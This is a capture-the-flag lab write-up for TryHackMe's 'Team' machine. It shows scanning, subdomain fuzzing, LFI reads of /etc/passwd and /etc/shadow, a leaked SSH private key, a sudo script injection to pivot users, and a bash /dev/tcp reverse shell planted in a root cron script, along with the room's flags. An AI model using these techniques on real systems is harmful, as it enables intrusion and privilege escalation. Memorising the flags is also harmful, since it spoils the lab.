# Team

## Initial Foothold
- **Port Scanning**
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Team]
└─$ sudo python3 pymap.py -t team.thm --all >> ports.txt

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Team]
└─$ cat ports.txt

[+] Port scanning...
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
[+] Enumerating open ports...

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)


PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
- **Directory Enum**

```sh
┌──(bc-here㉿BC-Here)-[~]
└─$ gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -o directory.txt

/scripts
/robots.txt
```

- After fuzzing `/scripts` I found a script.txt which seems interesting
```sh
┌──(bc-here㉿BC-Here)-[~]
└─$ gobuster dir -u http://team.thm/scripts -w /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt -x txt -o directory.txt

/scripts/script.txt
```
- From `/robots.txt` we found a name called `dale`

- **wfuzz**
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Team]
└─$ wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        89 L     220 W      2966 Ch     "www"
000000019:   200        9 L      20 W       187 Ch      "dev"
000000085:   200        9 L      20 W       187 Ch      "www.dev"
000000689:   400        12 L     53 W       422 Ch      "gc._msdcs"

Total time: 103.9202
Processed Requests: 4989
Filtered Requests: 4985
Requests/sec.: 48.00796

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Team]
└─$ ping dev.team.thm
PING team.thm (10.10.253.175) 56(84) bytes of data.
```
- I have added dev.team.thm to the `/etc/hosts`

![alt text](image.png)

![alt text](image-1.png)

![alt text](image-2.png)

- Lets analyse with burpsuite! 😎😎😎

![alt text](image-3.png)

- Got the user.txt!


##### user.txt:`THM{6Y0TXHz7c2d}`

- **Path Traversal**

- Using LFI list of Seclist
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/Team]
└─$ cat /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
.....


┌──(bc-here㉿BC-Here)-[~]
└─$ cat /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | xclip -selection clipboard

```

- This command will copy this huge list

![alt text](image-4.png)

- And paste it here

![alt text](image-5.png)

![alt text](image-6.png)

- here we found very interesting id_rsa key
```sh

#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
```
- Lets remove the # from the beginning .

```sh

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Team]
└─$ sed -i 's/^#//' id_rsa

┌──(bc-here㉿BC-Here)-[~/CTF/THM/Team]
└─$ ssh -i id_rsa dale@team.thm
Last login: Mon Sep 30 23:03:56 2024 from 10.11.96.92
dale@TEAM:~$
```

## Getting Root
```sh
dale@TEAM:~$ sudo -l

Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks

```
- Lets Check `/home/gyles/admin_checks`

```sh
dale@TEAM:/home/gyles$ cat admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"

```

- **Pivoting**
```sh
dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: name
Enter 'date' to timestamp the file: /bin/bash
The Date is now
python -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"
gyles@TEAM:/home/gyles$ cat .bash_history
```

- Found some interesting things
```sh

cat /usr/local/bin/main_backup.sh

sudo nano /opt/admin_stuff/script.sh

```
- Lets analyse them

```sh
gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```
```sh
gyles@TEAM:/home/gyles$ cat /opt/admin_stuff/script.sh
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```
- The script is connected with the main_backup.sh which is a bash file
    - Lets user bash reverse shell one-liner

```sh
gyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
bash -i >& /dev/tcp/10.11.96.92/8080 0>&1
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

```sh
┌──(bc-here㉿BC-Here)-[~]
└─$ nc -nlvp 8080
listening on [any] 8080 ...
connect to [10.11.96.92] from (UNKNOWN) [10.10.253.175] 40976
bash: cannot set terminal process group (4073): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# ls
ls
root.txt

```

- After waiting a little bit we got the root shell

```sh
root@TEAM:~# cat root.txt
cat root.txt
THM{fhqbznavfonq}
root@TEAM:~#
```

##### root.txt:`THM{fhqbznavfonq}`